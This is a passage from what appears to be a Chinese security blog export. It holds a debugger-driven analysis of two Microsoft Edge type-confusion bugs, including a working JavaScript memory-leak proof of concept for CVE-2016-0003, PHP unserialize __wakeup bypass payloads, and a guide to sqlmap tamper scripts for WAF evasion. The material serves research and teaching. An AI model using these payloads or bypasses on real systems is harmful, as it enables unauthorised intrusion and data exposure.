00007ffa`593e156c user32!UserCallWinProcCheckWow+0x27435 00000013`84bfd450 00007ffa`380ec781 user32!DispatchMessageWorker+0x1ac36 00000013`84bfd4d0 00007ffa`380eec41 EdgeContent!CBrowserTab::_TabWindowThreadProc+0x4a137 00000013`84bff720 00007ffa`4f7b9266 EdgeContent!LCIETab_ThreadProc+0x2c138 00000013`84bff840 00007ffa`59d98364 iertutil!SettingStore::CSettingsBroker::SetValue+0x24639 00000013`84bff870 00007ffa`59f55e91 KERNEL32!BaseThreadInitThunk+0x143a 00000013`84bff8a0 00000000`00000000 ntdll!RtlUserThreadStart+0x21 寄存器的值如下 1234567891:048&gt; rrax=0000000000003ffd rbx=0000000000000002 rcx=00000176d9804cf0rdx=000000000000bff7 rsi=0000000000003ffd rdi=0000000000000000rip=00007ffa3b9e04b6 rsp=0000001384bfad60 rbp=0000000000000002 r8=0000000300000003 r9=00000000800114a4 r10=0000000000000000r11=0000000000007ffa r12=00000176d9a9c680 r13=00000176d9734b01r14=00000176d9804c88 r15=0000000000000000iopl=0 nv up ei pl nz na pe nccs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010202 在ida中查看相关的代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139int __fastcall CAttrArray::PrivateFindInl(__int64 this, int a2, signed int CAttrValue__AATYPE)&#123; signed int v3; // edi@1 signed int v4; // er10@1 int v5; // er9@1 __int64 this_add_4; // r11@4 __int64 this_add_8; // r8@4 signed int v8; // ebx@4 unsigned __int64 v9; // rax@7 signed __int64 v10; // rdx@7 unsigned __int64 v11; // r11@8 int v12; // ecx@10 signed int v13; // ecx@16 __int64 v14; // rsi@22 int v15; // ecx@23 signed int v16; // ecx@34 signed int v17; // esi@38 signed __int64 v18; // rdx@38 int v19; // ecx@40 int v21; // [sp+38h] [bp+10h]@20 v3 = 0; v4 = CAttrValue__AATYPE; v5 = a2; if ( CAttrValue__AATYPE == 6 ) v4 = 0; if ( a2 == -1 ) &#123; v21 = -1; LODWORD(v9) = CAttrArray::PrivateFindLinear(this, (unsigned int)v4, &amp;v21, 0xFFFFFFFFi64); &#125; else &#123; this_add_4 = *(_DWORD *)(this + 4); this_add_8 = *(_QWORD *)(this + 8); v8 = 2; if ( v4 &gt; 2 ) v8 = v4; if ( (signed int)this_add_4 &lt; 11 ) &#123; v9 = *(_QWORD *)(this + 8); v10 = 3 * this_add_4; goto LABEL_8; &#125; if ( (signed int)this_add_4 &gt; 0 ) &#123; while ( 1 ) &#123; v14 = ((signed int)this_add_4 + v3) / 2; v9 = this_add_8 + 24 * v14; if ( *(_BYTE *)(this_add_8 + 24 * v14 + 3) &amp; 0x80 )// vuln v15 = *(_DWORD *)(v9 + 8); else v15 = *(_DWORD *)(*(_QWORD *)(v9 + 8) + 48i64); if ( a2 &lt; v15 ) &#123; LODWORD(this_add_4) = ((signed int)this_add_4 + v3) / 2; goto LABEL_26; &#125; if ( a2 &gt; v15 ) goto LABEL_30; v16 = *(_BYTE *)v9; if ( v4 == v16 ) return v9; if ( v8 &gt;= v16 ) break; LODWORD(this_add_4) = ((signed int)this_add_4 + v3) / 2;LABEL_26: if ( (signed int)this_add_4 - v3 &lt; 10 ) &#123; v9 = this_add_8 + 24i64 * v3; goto LABEL_28; &#125; if ( v3 &gt;= (signed int)this_add_4 ) goto LABEL_19; &#125; if ( v8 == 2i64 ) &#123; v17 = v14 - 1; v18 = v9 - 24; if ( v17 &gt;= v3 ) &#123; while ( 1 ) &#123; v19 = *(_BYTE *)(v18 + 3) &amp; 0x80 ? *(_DWORD *)(v18 + 8) : *(_DWORD *)(*(_QWORD *)(v18 + 8) + 48i64); if ( v5 != v19 ) break; if ( v4 == *(_BYTE *)v18 ) &#123; LODWORD(v9) = v18; return v9; &#125; if ( v17 != v3 ) &#123; v18 -= 24i64; if ( --v17 &gt;= v3 ) continue; &#125; break; &#125; &#125;LABEL_28: v10 = 3i64 * (signed int)this_add_4;LABEL_8: v11 = this_add_8 + 8 * v10; if ( v9 &lt; v11 ) &#123; while ( 1 ) &#123; if ( *(_BYTE *)(v9 + 3) &amp; 0x80 ) v12 = *(_DWORD *)(v9 + 8); else v12 = *(_DWORD *)(*(_QWORD *)(v9 + 8) + 48i64); if ( v12 &gt;= v5 ) &#123; if ( v12 != v5 ) goto LABEL_19; v13 = *(_BYTE *)v9; if ( v13 == v4 ) return v9; if ( v13 &gt; v8 ) goto LABEL_19; &#125; v9 += 24i64; if ( v9 &gt;= v11 ) goto LABEL_19; &#125; &#125; goto LABEL_19; &#125;LABEL_30: v3 = v14 + 1; goto LABEL_26; &#125;LABEL_19: LODWORD(v9) = 0; &#125; return v9;&#125; 其中引发问题的指令是 1if ( *(_BYTE *)(this_add_8 + 24 * v14 + 3) &amp; 0x80 ) 其中this_add_8变量对应的是 rcx+8 那么先查看下rcx的值 12345678910111213141516171:048&gt; dps rcx00000176`d9804cf0 00007ffa`3c562d38 edgehtml!CAttribute::`vftable&#x27;00000176`d9804cf8 00000003`0000000300000176`d9804d00 00000000`0000000800000176`d9804d08 00000000`0000000000000176`d9804d10 00000000`0000000000000176`d9804d18 00000176`dcc1815000000176`d9804d20 00007ffa`3c55fae0 edgehtml!s_propdescCElementstyle_Str00000176`d9804d28 00000000`800103eb00000176`d9804d30 00000176`d9a742f400000176`d9804d38 00000000`0000000000000176`d9804d40 00000000`0000000000000176`d9804d48 00000000`0000000000000176`d9804d50 00000176`d982850000000176`d9804d58 00000176`d98a858000000176`d9804d60 00000176`d9850c0000000176`d9804d68 00000176`d983c330 这里rcx是this指针，在CAttrArray::PrivateFindInl这个类的函数中应该是一个CAttrArray对象的this指针，可是这里rcx存了一个CAttribute的虚表对象，也就是说，在之前有一个错误的调用。 那么根据调用栈继续上溯，我们可以看到CAttrArray::SetParsed函数，调用PrivateFindInl的代码如下 123456if ( v6 || (v8 = *a1) == 0i64 || (LODWORD(v9) = CAttrArray::PrivateFindInl((__int64)v8, a2, 0), !v9) )&#123; v11 = v4; v10 = 31; CAttrArray::Set(v7, (unsigned int)v5, &amp;v10, 0i64);&#125; 也就是说这里如果该函数返回错误的值，那么CAttrArray::Set将不会执行。 继续向上回溯，查看CssParser::RecordProperty函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167void __fastcall CssParser::RecordProperty(CssParser *this, struct CssTokenizer *a2, __int32 a3, char a4, bool a5)&#123; char v5; // si@1 __int32 v6; // edi@1 struct CssTokenizer *v7; // r14@1 CssParser *v8; // rbp@1 CBase *v9; // rcx@3 char v10; // bl@4 bool v11; // r15@4 bool v12; // al@6 char v13; // r13@9 unsigned __int8 v14; // bl@10 MemoryProtection *v15; // rsi@11 const unsigned __int16 *v16; // r12@11 __int32 v17; // er8@13 __int64 v18; // rcx@18 const unsigned __int16 *v19; // rdi@18 unsigned __int64 v20; // rsi@18 __int64 v21; // rax@18 __int16 v22; // ax@24 unsigned __int64 v23; // r14@30 signed __int64 v24; // r14@31 const struct PROPERTYDESC *v25; // rax@37 int v26; // er10@37 CDoc *v27; // rax@44 const unsigned __int16 *v28; // rdx@51 unsigned __int16 *v29[2]; // [sp+20h] [bp-48h]@4 __int64 v30; // [sp+30h] [bp-38h]@4 __int32 v31; // [sp+80h] [bp+18h]@1 v31 = a3; v5 = a4; v6 = a3; v7 = a2; v8 = this; if ( *((_UNKNOWN **)this + 22) == &amp;CCSSStyleDeclaration::s_apHdlDescs &amp;&amp; *((_QWORD *)this + 2) ) &#123; v9 = (CBase *)*((_QWORD *)this + 23); if ( !v9 ) &#123;LABEL_4: v10 = 0; v30 = 0i64; _mm_storeu_si128((__m128i *)v29, 0i64); v11 = v6 == -1; v12 = v5 || v11; if ( a5 || v12 ) &#123; v13 = 1; if ( v12 ) v10 = -128; &#125; else &#123; v13 = 0; &#125; v14 = v10 | 8; if ( !v13 ) &#123;LABEL_11: v15 = (MemoryProtection *)v29[0]; v16 = &amp;g_szEmpty; if ( v11 ) &#123; if ( v29[0] ) v28 = v29[0]; else v28 = &amp;g_szEmpty; if ( CssParser::GetExpandoDispID(v8, v28, &amp;v31) ) &#123;LABEL_15: if ( v15 ) MemoryProtection::HeapFree(v15, (void *)a2); return; &#125; v6 = v31; &#125; if ( v6 != -1 ) &#123; v17 = *((_DWORD *)v8 + 7) + 1; if ( (unsigned int)v17 &gt; *((_DWORD *)v8 + 6) &gt;&gt; 2 ) &#123; if ( v17 &lt; 0 ) &#123; Abandonment::InvalidArguments(); JUMPOUT(*(_QWORD *)&amp;byte_18042A78B); &#125; CImplAry::EnsureSizeWorker((CssParser *)((char *)v8 + 24), 4ui64, v17); &#125; *(_DWORD *)(*((_QWORD *)v8 + 4) + 4i64 * (*((_DWORD *)v8 + 7))++) = v6; if ( v13 ) &#123; if ( v11 ) &#123; CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v31, &amp;pwzURI, v14); &#125; else &#123; v25 = GetStandardPropDescFromAliasDISPID(v31); if ( v25 ) v26 = *((_DWORD *)v25 + 12); if ( v15 ) v16 = (const unsigned __int16 *)v15; CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v26, v16, v14); &#125; &#125; &#125; goto LABEL_15; &#125; v18 = *((_QWORD *)v7 + 1); v19 = (const unsigned __int16 *)*((_QWORD *)v7 + 5); v20 = v18 + 2i64 * *((_DWORD *)v7 + 5); v21 = *((_DWORD *)v7 + 4); if ( v20 &gt; v18 + 2 * v21 ) v20 = v18 + 2 * v21; if ( !v11 ) &#123; if ( (unsigned __int64)v19 &gt;= v20 ) &#123;LABEL_31: v24 = (signed __int64)(v20 - (_QWORD)v19) &gt;&gt; 1; if ( !v11 &amp;&amp; (unsigned int)v24 &gt;= 0xA &amp;&amp; !StrCmpNICW(v20 - 20, L&quot;!important&quot;, 10i64) ) &#123; LODWORD(v24) = v24 - 10; v14 |= 2u; &#125; CBuffer::Append((CBuffer *)v29, v19, v24); CBuffer::TrimTrailingWhitespace((CBuffer *)v29); v6 = v31; goto LABEL_11; &#125; if ( 58 == *v19 ) ++v19; v22 = *(_WORD *)(v20 - 2); if ( v22 == 59 || !v22 || v22 == 125 ) v20 -= 2i64; &#125; if ( (unsigned __int64)v19 &lt; v20 ) &#123; while ( IsCharSpaceW(*v19) ) &#123; ++v19; if ( (unsigned __int64)v19 &gt;= v20 ) goto LABEL_31; &#125; if ( (unsigned __int64)v19 &lt; v20 ) &#123; do &#123; v23 = v20 - 2; if ( !IsCharSpaceW(*(_WORD *)(v20 - 2)) ) break; v20 -= 2i64; &#125; while ( (unsigned __int64)v19 &lt; v23 ); &#125; &#125; goto LABEL_31; &#125; v27 = CBase::GetCDoc(v9); if ( !v27 || CDoc::CheckCSSDiagnosticsAvailability(v27) ) &#123; v6 = v31; goto LABEL_4; &#125; &#125;&#125; CAttrArray::SetParsed的调用在下面两句： 1CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v31, &amp;pwzURI, v14); 1CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v26, v16, v14); 这里v8是this指针，也就是说在这里发生了一次错误的调用，本来应该传入的是CAttrArray，但是传入了一个CAttribute，造成了Type confusion 3. References1. project-zero 2. nvd 3. cve 4. seebug","categories":[{"name":"Misc","slug":"Misc","permalink":"https://blog.lyle.ac.cn/categories/Misc/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://blog.lyle.ac.cn/tags/CVE/"}]},{"title":"CVE-2016-0003 Edge Type Confusion","slug":"2017-8-11-cve-2016-0003","date":"2017-08-11T01:31:40.000Z","updated":"2023-04-06T02:11:31.962Z","comments":true,"path":"2017/08/11/2017-8-11-cve-2016-0003/","link":"","permalink":"https://blog.lyle.ac.cn/2017/08/11/2017-8-11-cve-2016-0003/","excerpt":"1. Vulnerability Description1.1 The IssueMS Edge CDOMTextNode::get_data type confusion 特别构造的JavaScript脚本可以触发Microsoft Edge的type confusion，使得可以像访问字符串一样访问C++对象。 这可能导致信息泄露，例如允许攻击者确定指向其他对象或函数的指针的值。","text":"1. Vulnerability Description1.1 The IssueMS Edge CDOMTextNode::get_data type confusion 特别构造的JavaScript脚本可以触发Microsoft Edge的type confusion，使得可以像访问字符串一样访问C++对象。 这可能导致信息泄露，例如允许攻击者确定指向其他对象或函数的指针的值。 1.2 Affect versionMicrosoft Edge 20.10240.16384.0 1.3 Timeline01&#x2F;12&#x2F;2016 Advisory disclosed01&#x2F;12&#x2F;2016 +0 days Countermeasure disclosed01&#x2F;12&#x2F;2016 +0 days SecurityTracker entry created01&#x2F;12&#x2F;2016 +0 days VulnerabilityCenter entry assigned01&#x2F;13&#x2F;2016 +1 days VulnerabilityCenter entry created01&#x2F;14&#x2F;2016 +1 days VulDB entry created01&#x2F;17&#x2F;2016 +3 days VulnerabilityCenter entry updated01&#x2F;19&#x2F;2016 +2 days VulDB last update 2. Technical description and PoC2.1 Description在DOM树中将一个节点作为子节点加到另一个节点时，Edge首先从其父节点中删除该节点，触发DOMNodeRemoved事件，然后重新附加该节点作为另一个节点的最后一个子节点。而在DOMNodeRemoved事件发生时，JavaScript的事件处理器可以更改DOM树，我们尝试在触发DOMNodeRemoved事件时向同一个父节点插入另一个文本子节点，这个操作在事件期间完成，因此该文本子节点在触发事件的节点之前作为子节点附加。而在触发DOMNodeRemoved事件处理程序之前，代码似乎确定了节点应该被附加的位置，因此最开始插入的节点在父文本节点之前而不是之后被插入。因为bug的存在，在完成所有这些操作后，DOM树已被破坏。这可以通过检查文本节点的.nextSibling属性是文本节点本身来确认, 即DOM树中有一个循环。另一个效果是，读取文本节点的nodeValue将导致类型混淆。这里Edge访问文本节点中存储的文本数据时，实际访问的却是一个C++对象。这样可以让攻击者读取存储在这个C++对象中的数据，其中包含各种指针。 2.2 JavaScript PoCSkylined给出了一个读取并显示DOM树对象的部分内容的PoC。该PoC已经在x64系统上进行了测试，允许攻击者绕过堆ASLR，读取堆指针。 读取的数据量可以由攻击者控制，并且可以读取分配给C++对象的内存之外的数据。攻击者可能能够使用一些堆的技巧将其他对象与C++DOM树对象中的有用信息放置在内存中，并从第二个对象读取数据。 exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;html&gt; &lt;head&gt; &lt;script&gt; var uNodeRemovedEvents = 0; onerror = function (sError, sSource, uLine)&#123; alert(sError + &quot; on line &quot; + uLine); &#125;; document.addEventListener(&quot;DOMNodeRemoved&quot;, function(oEvent) &#123; if (uNodeRemovedEvents++ == 0) &#123; oTextNode = document.createTextNode(&quot;[2]&quot;); // 这里有一个需要注意的地方 // insertBefore在Edge中如果没有第二个参数，那么等同于appendChild // 但是其他浏览器是不支持的 // 作者这里用insertBefore是为了更好的去判断是否有一个堆因为此处操作被allocated // 用于和之后的appendChild调用区分开 document.body.insertBefore(oTextNode); &#125;; &#125;, true); onload = function()&#123; // onload中首先执行的是appendChild // 这里oExistingChild已经有了父节点，所以会先从父节点移除这个元素，然后把它作为新父节点的最后一个子节点 // 其中移除操作会触发DOMNodeRemoved事件，而增加操作会触发DOMNodeInserted事件。 document.body.appendChild(oExistingChild); // 但是，在oExistingChild触发DOMNodeRemoved事件时， // oTextNode插入了节点中 // 最后oExistingChild成为了最后一个元素 // 但是这里出现了一个bug // oTextNode的nextSibling指向了自己 // 在这里，DOM树出现了一种类似循环的结构 for (var oNode = document.body.firstChild; oNode &amp;&amp; oNode != oNode.nextSibling; oNode = oNode.nextSibling) &#123; // 加上这段代码是为了防止被Edge检测到树的结构出现了问题 // 如果没有这段代码Js执行到这里的时候就会崩溃 &#125; if (oTextNode.nextSibling !== oTextNode) &#123; // 未触发漏洞时报错 throw new Error(&quot;Tree is not corrupt&quot;); &#125; alert(&quot;Set breakpoints if needed&quot;); // 这里是为了生成一个copy var sData = (&quot;A&quot; + oTextNode.nodeValue).substr(1); // 下面的逻辑是读取oTextNode.nodeValue的值 // 但实际上是内存中某块的位置 // 在读取之后按规则格式化输出 var sHexData = &quot;Read 0x&quot; + sData.length.toString(16); sHexData += &quot; bytes: ????????`????????&quot;; sHexQWord = &quot;`????????&quot;; for (var uBytes = 4, uOffset = 4, uIndex = 0; uIndex &lt; sData.length; uIndex++) &#123; var sHexWord = sData.charCodeAt(uIndex).toString(16); while (sHexWord.length &lt; 4) sHexWord = &quot;0&quot; + sHexWord; sHexQWord = sHexWord + sHexQWord; uBytes += 2; if (uBytes == 4) sHexQWord = &quot;`&quot; + sHexQWord; if (uBytes == 8) &#123; sHexData += &quot; &quot; + sHexQWord; sHexQWord = &quot;&quot;; uBytes = 0; &#125;; &#125;; if (sHexQWord) &#123; while (sHexQWord.length &lt; 17) &#123; if (sHexQWord.length == 8) sHexQWord += &quot;`&quot;; sHexQWord = &quot;????&quot; + sHexQWord; &#125; sHexData += &quot; &quot; + sHexQWord; &#125; alert(sHexData); // 代码执行到这里的时候会crash // 但是这里已经可以读取栈上的数据了 oTextNode.nodeValue = &quot;&quot;; &#125;; &lt;/script&gt; &lt;/head&gt; &lt;body&gt;x&lt;x id=oExistingChild&gt;&lt;/x&gt;&lt;/body&gt;&lt;/html&gt; 2.3 Code Analyze上面这个利用流程，比较关键的几个函数是CDOMTextNode::get_data、CDOMTextNode::get_length 读取数据的函数是CDOMTextNode::get_data，代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960__int64 __fastcall CDOMTextNode::get_data(CDOMTextNode *this, unsigned __int16 **a2)&#123; unsigned __int16 **v2; // rbx@1 CDOMTextNode *this_rdi; // rdi@1 Tree::TextData *v4; // rcx@2 __int32 v5; // eax@4 BSTR v6; // rax@4 int v7; // ebp@4 struct CTreePos *v8; // rax@4 struct CTreePos *v9; // rsi@4 Tree::TextNode *v10; // rdi@4 unsigned __int16 *v11; // rax@5 Tree::ANode *v12; // rax@5 CTreePos *v13; // rcx@6 __int64 v14; // r9@9 const OLECHAR *v15; // rax@9 UINT v16; // er9@9 BSTR v17; // rax@9 UINT ui; // [sp+48h] [bp+10h]@4 unsigned __int32 v20; // [sp+50h] [bp+18h]@5 v2 = a2; this_rdi = this; if ( a2 ) &#123; *a2 = 0i64; v4 = (Tree::TextData *)*((_QWORD *)this + 6); if ( v4 ) &#123; v14 = *(_DWORD *)v4; v15 = Tree::TextData::GetText(v4, 0, 0i64); v17 = SysAllocStringLen(v15, v16); *v2 = (unsigned __int16 *)Abandonment::CheckAllocationUntyped(v17); &#125; else if ( CDOMTextNode::IsPositioned(this_rdi) ) &#123; ui = 0; v5 = CDOMTextNode::get_length(this_rdi, (__int32 *)&amp;ui); Abandonment::CheckHRESULTStrict(v5); v6 = SysAllocStringLen(0i64, ui); *v2 = (unsigned __int16 *)Abandonment::CheckAllocationUntyped(v6); v7 = 0; LODWORD(v8) = Tree::TextNode::TextNodeFromDOMTextNode((__int64)this_rdi); v9 = v8; v10 = v8; do &#123; v11 = Tree::TextNode::Text(v10, 0, &amp;v20); memcpy_s(&amp;(*v2)[v7], 2i64 * (signed int)(ui - v7), v11, 2i64 * v20); v7 += v20; v12 = Tree::TreeReader::GetNextSiblingWithFilter( v10, (enum Tree::NodeFilterResultsEnum (__stdcall __high static *)(const struct Tree::ANode *))&amp;Dom::TreeReader::ScriptableIdentityFilter); v10 = v12; &#125; while ( v12 &amp;&amp; Tree::ANode::IsTextNode(v12) &amp;&amp; CTreePos::IsSameTextOrCDataNode(v13, v9) ); &#125; &#125; return 0i64;&#125; 在函数中有一次调用CDOMTextNode::get_length(this_rdi, (__int32 *)&amp;ui)代码如下，其中a2的值是ui，也就是0，而CDOMTextNode::IsPositioned(this)返回值为真，即进入了第二个逻辑，在该逻辑中进行了长度的处理 获取长度后，则在get_data函数中，在memcpy_s(&amp;(*v2)[v7], 2i64 * (signed int)(ui - v7), v11, 2i64 * v20)这行代码利用memcpy_s不断读取内存中的值至长度到达之前get_length函数返回的值位置。 这里读取的是v11指向中保存地址指向的值，那我们再上溯，v11 = Tree::TextNode::Text(v10, 0, &amp;v20);，其中v10的值是Tree::TextNode::TextNodeFromDOMTextNode返回的一个结构体指针，而调用该函数的参数是rcx。 12345678910111213141516171819202122232425262728293031323334353637383940414243__int64 __fastcall CDOMTextNode::get_length(CDOMTextNode *this, __int32 *a2)&#123; __int32 *v2; // rax@1 signed int v3; // ebx@1 __int32 *v4; // rsi@1 CDOMTextNode *v5; // rdi@1 struct CTreePos *v7; // rax@6 struct CTreePos *v8; // rbp@6 struct CTreePos *v9; // r11@6 __int32 v10; // edi@6 Tree::ANode *v11; // rax@7 CTreePos *v12; // rcx@8 v2 = (__int32 *)*((_QWORD *)this + 6); v3 = 0; v4 = a2; v5 = this; if ( v2 ) &#123; *a2 = *v2; &#125; else if ( CDOMTextNode::IsPositioned(this) ) &#123; LODWORD(v7) = Tree::TextNode::TextNodeFromDOMTextNode((__int64)v5); v8 = v7; v9 = v7; v10 = 0; do &#123; v10 += **((_DWORD **)v9 + 7); v11 = Tree::TreeReader::GetNextSiblingWithFilter( v9, (enum Tree::NodeFilterResultsEnum (__stdcall __high static *)(const struct Tree::ANode *))&amp;Dom::TreeReader::ScriptableIdentityFilter); &#125; while ( v11 &amp;&amp; Tree::ANode::IsTextNode(v11) &amp;&amp; CTreePos::IsSameTextOrCDataNode(v12, v8) ); *v4 = v10; &#125; else &#123; v3 = -2147024809; &#125; return (unsigned int)v3;&#125; 2.4 Dynamic Analysis对get_data下断点后开始单步跟踪，发现这里get_length函数的返回值和节点oExistingChild的长度相关，也就是说，这里出现了一个bug，在本来应该读取textnode的长度的时候，返回了一个和oExistingChild长度相关的数值，即我们可以一定程度上控制读取的数据长度，当然，这里数据如果太长，在读取的时候会触发一个访问错误，导致进程崩溃无法继续读取。 最后结合动态调试和代码分析发现length是从结构体指针处偏移0x1c的位置指向的指针指向的位置中取出来，即first_struct-&gt;other_struct-&gt;length。而读取的地址位置则是结构体指针偏移0xC的位置。 3. References1. zerodayinitiative 2. microsoft 3. securitytracker 4. cve.mitre.org 5. vuldb 6. skylined blog","categories":[{"name":"Misc","slug":"Misc","permalink":"https://blog.lyle.ac.cn/categories/Misc/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://blog.lyle.ac.cn/tags/CVE/"}]},{"title":"php unserialize()/wakeup()漏洞","slug":"php-unserialize","date":"2016-10-29T01:31:40.000Z","updated":"2023-04-06T02:11:31.962Z","comments":true,"path":"2016/10/29/php-unserialize/","link":"","permalink":"https://blog.lyle.ac.cn/2016/10/29/php-unserialize/","excerpt":"unserialize和serialize这里不做赘述。 unserialize的漏洞在magic function上，如果一个类定义了__wakup()和__destruct()，则该类的实例被反序列化时，会自动调用__wakeup(), 生命周期结束时，则调用__desturct()。","text":"unserialize和serialize这里不做赘述。 unserialize的漏洞在magic function上，如果一个类定义了__wakup()和__destruct()，则该类的实例被反序列化时，会自动调用__wakeup(), 生命周期结束时，则调用__desturct()。 下面提供一个简单的demo. 12345678910111213141516171819202122232425class Demo&#123; public $data; public function __construct($data) &#123; $this-&gt;data = $data; echo &quot;construct&lt;br /&gt;&quot;; &#125; public function __wakeup() &#123; echo &quot;wake up&lt;br /&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;Data&#x27;s value is $this-&gt;data. &lt;br /&gt;&quot;; echo &quot;destruct&lt;br /&gt;&quot;; &#125;&#125;var_dump(serialize(new Demo(&quot;raw value&quot;))); 输出 1234constructData&#x27;s value is raw value.destructstring(44) &quot;O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;data&quot;;s:9:&quot;raw value&quot;;&#125;&quot; 把序列化的字符串修改一下后，执行 1unserialize(&#x27;O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;data&quot;;s:15:&quot;malicious value&quot;;&#125;&#x27;); 输出 123wake upData&#x27;s value is malicious value.destruct 这里看到，值被修改了. 上面是一个unserialize()的简单应用，不难看出，如果__wakeup()或者 __desturct()有敏感操作，比如读写文件、操作数据库，就可以通过函数实现文件读写或者数据读取的行为。 那么，在__wakeup()中加入判断是否可以阻止这个漏洞呢？在__wakeup()中我们加入一行代码 12345public function __wakeup()&#123; if($this-&gt;data != &#x27;raw value&#x27;) $this-&gt;data = &#x27;raw value&#x27;; echo &quot;wake up&lt;br /&gt;&quot;;&#125; 但其实还是可以绕过的，在 PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 的版本都存在wakeup的漏洞。当反序列化中object的个数和之前的个数不等时，wakeup就会被绕过，于是使用下面的payload 1unserialize(&#x27;O:7:&quot;HITCON&quot;:1:&#123;s:4:&quot;data&quot;;s:15:&quot;malicious value&quot;;&#125;&#x27;); 输出 12Data&#x27;s value is malicious value.destruct 这里wakeup被绕过，值依旧被修改了。","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.lyle.ac.cn/categories/Web/"}],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://blog.lyle.ac.cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"https://blog.lyle.ac.cn/tags/PHP/"}]},{"title":"sqlmap-tamper编写指南","slug":"2016-6-6-sqlmap-tamper","date":"2016-06-06T01:31:40.000Z","updated":"2023-04-06T02:11:31.962Z","comments":true,"path":"2016/06/06/2016-6-6-sqlmap-tamper/","link":"","permalink":"https://blog.lyle.ac.cn/2016/06/06/2016-6-6-sqlmap-tamper/","excerpt":"注：最近遇到了一些奇奇怪怪的waf，想自己写一些tamper但是发现没有参考材料可以使用，因此写了这篇文章，以方便进行自定义的tamper编写。笔者笔力有限，如有错误，敬请读者们指正。 0x00 sqlmap tamper简介sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。","text":"注：最近遇到了一些奇奇怪怪的waf，想自己写一些tamper但是发现没有参考材料可以使用，因此写了这篇文章，以方便进行自定义的tamper编写。笔者笔力有限，如有错误，敬请读者们指正。 0x00 sqlmap tamper简介sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。 0x01 一个最小的例子为了说明tamper的结构，让我们从一个最简单的例子开始 1234567891011# sqlmap/tamper/escapequotes.pyfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWESTdef dependencies(): passdef tamper(payload, **kwargs): return payload.replace(&quot;&#x27;&quot;, &quot;\\\\&#x27;&quot;).replace(&#x27;&quot;&#x27;, &#x27;\\\\&quot;&#x27;) 不难看出，一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义。 priority定义脚本的优先级，用于有多个tamper脚本的情况。 dependencies函数声明该脚本适用&#x2F;不适用的范围，可以为空。 tamper是主要的函数，接受的参数为payload和**kwargs返回值为替换后的payload。比如这个例子中就把引号替换为了\\\\\\\\&#39;。 0x02 详细介绍第一部分完成了一个最简单的tamper架构，下面我们进行更详细的介绍 tamper函数tamper是整个脚本的主体。主要用于修改原本的payload。举例来说，如果服务器上有这么几行代码 12$id = trim($POST($id),&#x27;union&#x27;);$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27;&quot;; 而我们的payload为 1-8363&#x27; union select null -- - 这里因为union被过滤掉了，将导致payload不能正常执行，那么就可以编写这样的tamper 12def tamper(payload, **kwargs): return payload.replace(&#x27;union&#x27;,&#x27;uniounionn&#x27;) 保存为replaceunion.py，存到sqlmap&#x2F;tamper&#x2F;下，执行的时候带上–tamper&#x3D;replaceunion的参数，就可以绕过该过滤规则 dependencies函数dependencies函数，就tamper脚本支持&#x2F;不支持使用的环境进行声明，一个简单的例子如下： 123456789# sqlmap/tamper/echarunicodeencode.pyfrom lib.core.common import singleTimeWarnMessagedef dependencies(): singleTimeWarnMessage(&quot;tamper script &#x27;%s&#x27; is only meant to be run against ASP or ASP.NET web applications&quot; % os.path.basename(__file__).split(&quot;.&quot;)[0])# singleTimeWarnMessage() 用于在控制台中打印出警告信息 kwargs在官方提供的47个tamper脚本中，kwargs参数只被使用了两次，两次都只是更改了http-header，这里以其中一个为例进行简单说明 123456# sqlmap/tamper/vanrish.pydef tamper(payload, **kwargs): headers = kwargs.get(&quot;headers&quot;, &#123;&#125;) headers[&quot;X-originating-IP&quot;] = &quot;127.0.0.1&quot; return payload 这个脚本是为了更改X-originating-IP，以绕过WAF，另一个kwargs的使用出现于xforwardedfor.py，也是为了改header以绕过waf 0x3 结语tamper的编写远不止这些，本文只就其最基本的结构进行探讨。作为sqlmap的扩展，在编写tamper时几乎所有的sqlmap内置的函数、变量都可以使用，本文不一一列出。 0x04 附录：部分常数值12345678910111213141516171819202122232425# sqlmap/lib/enums.pyclass PRIORITY: LOWEST = -100 LOWER = -50 LOW = -10 NORMAL = 0 HIGH = 10 HIGHER = 50 HIGHEST = 100class DBMS: ACCESS = &quot;Microsoft Access&quot; DB2 = &quot;IBM DB2&quot; FIREBIRD = &quot;Firebird&quot; MAXDB = &quot;SAP MaxDB&quot; MSSQL = &quot;Microsoft SQL Server&quot; MYSQL = &quot;MySQL&quot; ORACLE = &quot;Oracle&quot; PGSQL = &quot;PostgreSQL&quot; SQLITE = &quot;SQLite&quot; SYBASE = &quot;Sybase&quot; HSQLDB = 